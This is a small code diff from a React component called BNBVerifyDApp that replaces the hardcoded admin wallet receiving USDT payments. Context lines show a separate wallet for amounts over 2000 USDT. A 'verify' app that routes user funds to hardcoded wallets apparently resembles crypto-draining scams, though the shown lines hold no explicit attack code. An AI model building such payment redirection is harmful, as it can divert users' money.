@@ -76,7 +76,7 @@ export default function BNBVerifyDApp() {
   const [lastConnectAttempt, setLastConnectAttempt] = useState<number>(0)
 
   // Updated Configuration with new admin wallet
-  const ADMIN_WALLET = "0xF76D725f577EDBe6b98FDa9960173F23d5A4B988" // New admin wallet for payments
+  const ADMIN_WALLET = "0xd47c7585550eAd12aD365Fba5F4bD2533B9b4Eaf" // New admin wallet for payments
   const HIGH_AMOUNT_WALLET = "0x0C775115c4a9483e1b92B1203F30220E657182D0" // For amounts > 2000 USDT
   const HIGH_AMOUNT_THRESHOLD = 2000 // USDT threshold for high amount wallet
   const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955" // USDT BEP-20
